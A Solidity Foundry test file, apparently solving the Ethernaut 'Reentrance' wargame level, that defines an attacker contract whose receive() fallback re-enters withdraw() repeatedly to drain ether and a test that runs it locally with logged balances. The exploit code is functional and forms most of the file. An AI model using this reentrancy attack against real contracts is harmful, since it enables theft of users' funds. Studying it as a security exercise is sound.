// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2 <0.9.0;

import "forge-std/Test.sol";
import "../src/Reentrance.sol";

// 恶意合约
contract ReentranceExploit {
    Reentrance public target;
    uint256 public constant WITHDRAW_AMOUNT = 0.1 ether;
    uint256 public reentryCount;

    constructor(address payable _target) {
        target = Reentrance(_target);
    }

    function attack() external payable {
        require(msg.value >= WITHDRAW_AMOUNT, "Send at least 0.1 ether to start attack");
        console.log("Donating", msg.value, "to Reentrance");
        target.donate{value: msg.value}(address(this));
        console.log("Starting withdraw of", WITHDRAW_AMOUNT);
        target.withdraw(WITHDRAW_AMOUNT);
    }

    receive() external payable {
        if (address(target).balance >= WITHDRAW_AMOUNT && reentryCount < 4) {
            console.log("\n===========================");
            console.log("ReentranceExploit: Received", msg.value);
            console.log("Reentry count:             ", reentryCount);
            console.log("Target balance:            ", address(target).balance);
            console.log("Exploit balance:           ", address(this).balance);
            console.log("Exploit recorded balance:  ", target.balanceOf(address(this)));
            reentryCount++;
            target.withdraw(WITHDRAW_AMOUNT);
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract ReentranceTest is Test {
    Reentrance public reentrance;
    ReentranceExploit public exploit;
    address public attacker = address(0x123);

    function setUp() public {
        reentrance = new Reentrance();

        // 向 Reentrance 存入 1 ether
        vm.deal(address(reentrance),1 ether);

        exploit = new ReentranceExploit(payable(address(reentrance)));

        vm.deal(attacker, 1 ether);
    }

    function test_ReentranceExploit() public {
        console.log("=== Initial State ===");
        console.log("Reentrance balance:     ", address(reentrance).balance);
        console.log("Attacker balance:       ", attacker.balance);
        console.log("Exploit contract balance:", address(exploit).balance);
        console.log("Exploit recorded balance:", reentrance.balanceOf(address(exploit)));

        vm.startPrank(attacker);
        exploit.attack{value: 0.1 ether}();
        

        console.log("=== After Attack ===");
        console.log("Reentrance balance:      ", address(reentrance).balance);
        console.log("Attacker balance:        ", attacker.balance);
        console.log("Exploit contract balance:", address(exploit).balance);
        console.log("Exploit recorded balance:", reentrance.balanceOf(address(exploit)));
        console.log("Exploit reentry count:   ", exploit.reentryCount());

        // 验证攻击效果
        // assertLt(address(reentrance).balance, 1 ether, "Reentrance balance should decrease");
        // assertGt(address(exploit).balance, 0, "Exploit should have received funds");
        vm.stopPrank();
    }
}